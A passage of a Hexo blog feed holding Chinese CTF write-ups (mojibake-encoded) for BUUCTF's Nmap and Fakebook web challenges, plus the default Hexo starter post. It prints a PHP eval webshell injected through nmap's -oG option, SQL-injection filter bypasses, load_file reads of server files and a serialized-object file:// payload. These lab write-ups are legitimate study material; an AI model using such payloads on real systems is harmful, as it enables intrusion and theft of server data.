alt="image-20230822131843981"></p><p>å‘ç°æˆåŠŸç»•è¿‡:<br>è®¿é—®pass.phtml:</p><p>ç”±äºå½“äºoGè¾“å‡ºçš„æ–‡ä»¶éƒ½åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€ä»¥ä¸º:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" alt="image-20230822132212701"></p><p>å‘ç°å½“å‰ç½‘ç«™ä¸‹æ²¡æœ‰è¯¥æ–‡ä»¶ï¼Œä»ä¹‹å‰çš„[BUUCTF 2018]Online Toolä¸­è·å–çš„ç»éªŒï¼Œnmapå¯èƒ½å’Œescapeshellarg()ä¸escapeshellcmd()é…åˆä½¿ç”¨ï¼Œéœ€è¦ç»•è¿‡è¿™ä¸¤ä¸ªå‡½æ•°ï¼šä½¿ç”¨ç©ºæ ¼å’Œå•å¼•å·,ä¸ºäº†é˜²æ­¢â€™passâ€™çš„å•å¼•å·ä¹Ÿè¢«è¿™ä¸¤ä¸ªå‡½æ•°è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨â€passâ€:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" alt="image-20230822132957714"></p><p>è®¿é—®pass.phtml:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" alt="image-20230822132932341"></p><p>ä½¿ç”¨webshellæµ‹è¯•:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" alt="image-20230822133218223"></p><p>å‘ç°ä¸€ä¸ªflagæ–‡ä»¶:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>è¿”å›ç»“æœ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt"># Nmap 6.47 scan initiated Tue Aug 22 05:28:38 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/e0e2e -oG pass.phtml \ flag&#123;544d334f-80b2-44f8-a3b1-c8b312b0b484&#125;<br> \\<br># Nmap done at Tue Aug 22 05:28:39 2023 -- 0 IP addresses (0 hosts up) scanned in 0.27 seconds<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{544d334f-80b2-44f8-a3b1-c8b312b0b484}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_Fakebook1 é¢˜è§£</title>
    <link href="/2023/08/21/2023-08-20-Fakebook1/"/>
    <url>/2023/08/21/2023-08-20-Fakebook1/</url>
    
    <content type="html"><![CDATA[<h1 id="Fakebook1"><a href="#Fakebook1" class="headerlink" title="Fakebook1"></a>Fakebook1</h1><p>1.ç‚¹å‡»ç™»é™†ç•Œé¢join,ç”³è¯·ä¸€ä¸ªç”¨æˆ·:<br>admin,123,18,bai.com</p><p>2.ç™»å½•ç½‘ç«™åï¼Œç‚¹å‡»admin,å‘ç°ç½‘å€æœ‰æ³¨å…¥ç‚¹:</p><p><a href="http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1">http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1</a></p><p>no,åº”è¯¥æ˜¯è®°å½•çš„ç¼–å·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡noè¿›è¡Œæ³¨å…¥</p><p>æ³¨å†Œä¸€ä¸ªè´¦æˆ·ä¹‹åè‡ªåŠ¨ç”Ÿæˆè®°å½•çš„ç¼–å·ï¼Œæ‰€ä»¥ç¼–å·ä¸ºè‡ªåŠ¨é€’å¢å‹ä¸ºint</p><p>3.éšä¾¿æ³¨å…¥no&#x3D;1â€™,ç½‘é¡µå“åº”æœ‰sqlæŠ¥é”™ï¼Œæ‰€ä»¥è¯¥ç½‘é¡µå­˜åœ¨sqlè¯­å¥æ³¨å…¥</p><p>4.çŒœæµ‹è¯¥ç½‘é¡µä½¿ç”¨äº†select * from where no &#x3D; </p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨1 union select 1,2,3;#</p><p>ä½†æ˜¯è¿”å›äº†no hacker,æ‰€ä»¥å¯èƒ½è¿‡æ»¤äº†select</p><p>æ‰€ä»¥å¯ä»¥ç”¨</p><p>â€“ å†…è”æ³¨é‡Šç»•è¿‡<br>&#x2F;*!select *&#x2F;1ï¼Œ2ï¼Œ3ï¼Œ4;</p><p>5.çˆ†å­—æ®µ:1 order by 4;#</p><p>å½“order by 5#æ—¶æŠ¥é”™ï¼Œæ‰€ä»¥æœ€å¤§å­—æ®µæ•°ä¸º4</p><p>6.ä½¿ç”¨-1 union&#x2F;*!select *&#x2F;1ï¼Œ2ï¼Œ3ï¼Œ4;</p><p>åªæœ‰usernameè¿”å›å€¼ä¸º2ï¼Œæ‰€ä»¥åªæœ‰ç¬¬äºŒä¸ªå­—æ®µèƒ½å¤ŸæˆåŠŸè¿”å›å€¼</p><p>ä½¿ç”¨-1æ˜¯ä¸ºäº†ä½¿å“åº”ç½‘å€åªè¿”å›æˆ‘ä»¬selectçš„å†…å®¹</p><p>7.çˆ†æ•°æ®åº“:-1 union&#x2F;*!select *&#x2F;1,database(),3,4;</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(database()),3,4;&#x2F;&#x2F;çˆ†å‡ºæ‰€æœ‰æ•°æ®åº“</p><p>uernameçˆ†å‡ºæ•°æ®åº“ä¸ºfakebook</p><p>åªæœ‰ä¸€ä¸ªæ•°æ®åº“</p><p>8.çˆ†è¡¨</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema</p><p>&#x3D; DATABASE();&#x2F;&#x2F;database()å¯ä»¥ç›´æ¥æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼Œä¸€èˆ¬æ˜¯åªæœ‰ä¸€ä¸ªæ•°æ®åº“æ‰å¯ä»¥ç”¨ï¼Œå¦åˆ™å°±è¦æŒ‡å®šæ•°æ®åº“</p><p>usernameå­—æ®µæ˜¾ç¤ºusersè¡¨</p><p>9.çˆ†å­—æ®µ</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(column_name),3,4  from information_schema.COLUMNS where table_schema &#x3D; â€˜fakebookâ€™ and table_name &#x3D; â€˜usersâ€™;</p><p>usernameå­—æ®µæ˜¾ç¤ºno,username,passwd,dataå­—æ®µ</p><p>dataå­—æ®µæ˜¯ä¹‹å‰æ²¡æœ‰çœ‹åˆ°è¿‡çš„ï¼Œæ‰€ä»¥ç°åœ¨è¦æŸ¥çœ‹å­—æ®µçš„å€¼</p><p>10.çˆ†å­—æ®µçš„å€¼</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(data),3,4 from users</p><p>username:çˆ†å‡ºå­—æ®µå€¼:O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:7:â€bai.comâ€;} </p><p>è¿™æ˜¯ä¸€ä¸ªåºåˆ—åŒ–è¯­å¥:è¡¨ç¤ºæœ‰ä¸€ä¸ªUserInfoç±»ï¼Œè¿™ä¸ªç±»æœ‰å‚æ•°name,age,blog</p><p>æ²¡æœ‰è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æŸ¥çœ‹å…¶ä»–å‡ ä¸ªå­—æ®µçš„å†…å®¹</p><p>11.çˆ†å…¶ä»–å­—æ®µ:</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(no,username,passwd),3,4 from users</p><p>usernameçˆ†å‡ºå­—æ®µçš„å€¼:1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>å‘ç°é™¤äº†noå’Œusernameå­—æ®µå…¶ä»–ä¸ºå¯†æ–‡ï¼Œè¿›è¡Œè§£å¯†:</p><p>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>å‘ç°è§£å¯†å¤±è´¥ï¼Œæ‰€ä»¥å¯èƒ½ä¸æ˜¯å¯†æ–‡</p><p>12.æŸ¥çœ‹ç½‘é¡µçš„robots.txtæ–‡ä»¶ï¼ŒæŸ¥çœ‹ç½‘é¡µè¿˜å…è®¸æˆ‘ä»¬æŸ¥çœ‹çš„æ–‡ä»¶æœ‰å“ªäº›:</p><p><a href="http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt">http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt</a></p><p>è·å¾—ä¸€ä¸ªuser.php.bakæ–‡ä»¶ï¼Œå°†å®ƒä¸‹è½½:</p><p>13.åˆ†æuser.php.bakä¸­çš„ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//UserInfoç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//æœ‰å‚ç”³è¯·ç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//curl_init()å‡½æ•°ç”¨äºåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œå¯ä»¥ç”¨äºè·å–ç½‘é¡µåœ°å€ã€è®¾ç½®ç½‘é¡µå¤´ä¿¡æ¯ç­‰</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-comment">//curl_setopt â€” è®¾ç½®ä¸€ä¸ªcURLä¼ è¾“é€‰é¡¹</span><br>        <span class="hljs-comment">//CURLOPT_URL: è¿™æ˜¯ä½ æƒ³ç”¨PHPå–å›çš„URLåœ°å€ã€‚ä½ ä¹Ÿå¯ä»¥åœ¨ç”¨curl_init()å‡½æ•°åˆå§‹åŒ–æ—¶è®¾ç½®è¿™ä¸ªé€‰é¡¹</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-comment">//blogå†…å®¹çš„å¤„ç†</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ä»£ç å±•ç¤ºäº†ä¸€ä¸ªUserInFoçš„ç±»çš„å…·ä½“å†…å®¹å’Œå‚æ•°ï¼Œä»¥ä¾¿ä¹‹åçš„åºåˆ—åŒ–å¤„ç†</p><p>14.ç”±ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹å¾—ï¼š</p><p><strong>the contents of his&#x2F;her blog</strong></p><p><strong>ä¸‹é¢ä¸€å—ä¸å¯è§åŒºåŸŸä¸ºï¼Œæˆ‘ä»¬è¾“å…¥çš„blogï¼ˆåšå®¢ï¼‰çš„å†…å®¹ï¼Œæ‰€ä»¥çŒœæµ‹å¦‚æœæˆ‘ä»¬è¾“å…¥çš„åšå®¢å†…å®¹ä¸ºflag.php,åˆ™ä¼šæ˜¾ç¤ºè¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬è¦çŸ¥é“ç½‘ç«™flag.phpçš„å…·ä½“æ–‡ä»¶è·¯å¾„</strong></p><p><strong>ç½‘é¡µä¸­æºä»£ç çš„æè¿°è¿™å—å†…å®¹:</strong><br><strong>src &#x3D; â€˜data:text&#x2F;html;base64,PCFâ€¦â€¦â€¦â€™</strong></p><p><strong>æ‰€ä»¥dataçš„ç±»å‹æ˜¯textæ–‡æœ¬å‹</strong></p><p>æ‰€ä»¥ç½‘é¡µçš„æºåœ°å€ä¼ è¾“ä¸ºdata,çŒœæµ‹å¯èƒ½åˆ©ç”¨çš„æ˜¯ç¬¬å››ä¸ªå­—æ®µdataä¸­çš„å†…å®¹:</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:7:â€bai.comâ€;} </p><p>dataå­—æ®µä¸­çš„å†…å®¹æ˜¯ç»è¿‡åºåˆ—åŒ–å¤„ç†çš„ç»“æœ</p><p>15.åˆ©ç”¨æŠ¥é”™æ³¨å…¥è·å–flag.phpçš„æ–‡ä»¶è·¯å¾„:</p><p>or(updatexml(1,concat(â€˜<del>â€˜,(SELECT(load_file(â€œflag.phpâ€)),â€™</del>â€˜),1))#</p><p>or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))#</p><p>é€šè¿‡ç­›é€‰ï¼Œå‘ç°ç½‘ç«™è¿‡æ»¤äº†â€™xâ€™</p><p>æ‰€ä»¥ç”¨å­—ç¬¦â€™<del>â€˜:or(updatexml(1,concat(â€˜</del>â€˜,(SELECT(load_file(â€œflag.phpâ€)),â€™~â€™),1))#</p><p>è¿”å›æŠ¥é”™å†…å®¹:</p><p>[*] query error! (Incorrect parameter count in the call to native function â€˜updatexmlâ€™)</p><p><strong>Fatal error</strong>:  Call to a member function fetch_assoc() on boolean in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php</strong> on line <strong>66</strong></p><p>æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹flag.phpçš„åœ°å€ä¸º&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p><strong>å…¶å®ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„å‚æ•°éƒ½ä¼šæŠ¥é”™æ˜¾ç¤ºåœ°å€&#x2F;var&#x2F;www&#x2F;html&#x2F;db.phpï¼Œæ‰€ä»¥ä¸€å®šè¦æ³¨æ„ä»»ä½•æŠ¥é”™ä¿¡æ¯</strong></p><p>16.æ‰€ä»¥blog&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>æ‰€ä»¥è¦çˆ†å‡ºè¯¥æ–‡ä»¶çš„å†…å®¹:select load_file(â€œæ–‡ä»¶è·¯å¾„â€);å¯ä»¥è·å–è¯¥æ–‡ä»¶çš„å†…å®¹</p><p>-1 union&#x2F;*!select *&#x2F;1,load_file(â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€),3,4</p><p><strong>usernameæ²¡æœ‰è¿”å›å†…å®¹ï¼Œä½†æ˜¯é¡µé¢äº§ç”Ÿäº†å“åº”ï¼Œè¯´æ˜usernameæ‰€æ˜¾ç¤ºçš„å†…å®¹ï¼Œä¸ç¬¦åˆè¯¥å­—æ®µæ‰€èƒ½æ˜¾ç¤ºçš„å†…å®¹çš„æ ¼å¼ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼ŒæŸ¥çœ‹æœ¬æ¥åº”è¯¥åœ¨è¯¥å­—æ®µä¸­æ˜¾ç¤ºçš„å†…å®¹ï¼š</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                username<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                age<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                blog<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$flag = &quot;flag&#123;ab61868d-16df-4976-93c7-8980c7fbc7be&#125;&quot;;</span><br><span class="hljs-meta">exit(0);</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;53&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;56&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">        &lt;/tr&gt;</span><br><span class="hljs-meta">    &lt;/table&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥flagä¸º:</p><p>flag{ab61868d-16df-4976-93c7-8980c7fbc7be}</p><p>16.å¦‚æœç½‘ç«™è¿‡æ»¤äº†load_file(â€œè·¯å¾„â€):</p><p>ç¬¬å››ä¸ªå­—æ®µdataæ‰€æ˜¾ç¤ºçš„ä½ç½®ä¸º:the contents of his&#x2F;her blog</p><p>è¯¥å­—æ®µä¸ºå°†å­˜å‚¨äºæ•°æ®åº“ä¸­çš„å¦‚O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:7:â€bai.comâ€;} çš„å†…å®¹å–å‡ºï¼Œç„¶åæ ¹æ®è¯¥dataä¸­blogçš„åœ°å€ï¼Œè®¿é—®å‡ºblogçš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©å®ƒæ˜¾ç¤º&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpçš„å†…å®¹</p><p>å‡è®¾å®ƒç½‘é¡µæ˜¯å¯¹è¿™ä¸ªåºåˆ—åŒ–çš„å†…å®¹base-64åŠ å¯†ç„¶åè®¿é—®ï¼Œåˆ™æˆ‘ä»¬ä¹Ÿåªéœ€è¦è®©å®ƒè®¿é—®åºåˆ—åŒ–çš„dataï¼š</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}</p><p>payload:</p><p>-1 union&#x2F;*!select *&#x2F;1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€ï¼›}â€™:</p><p><strong>the contents of his&#x2F;her blog,æ²¡æœ‰æ˜¾ç¤ºå†…å®¹ï¼Œå¯èƒ½ä¾ç„¶ä¸ºéè¯¥å­—æ®µçš„æ ¼å¼å†…å®¹ï¼Œæ‰€ä»¥æŸ¥çœ‹ç½‘é¡µæºä»£ç :</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the contents of his/her blog<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;100%&#x27;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#x27;10em&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxOTUxNDdkZi1iN2NhLTQ1NjAtYmVjYi1kOTg1OTI4NTBmYzh9IjsNCmV4aXQoMCk7DQo=&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåŒºåŸŸæ˜¾ç¤ºçš„å†…å®¹ä¸ºsrcæ‰€æŒ‡å‘åŒºåŸŸï¼Œæ‰€ä»¥ç‚¹å‡»srcæ‰€æŒ‡å‘çš„åŒºåŸŸ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;195147df-b7ca-4560-becb-d98592850fc8&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag.phpçš„å†…å®¹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/21/hello-world/"/>
    <url>/2023/08/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 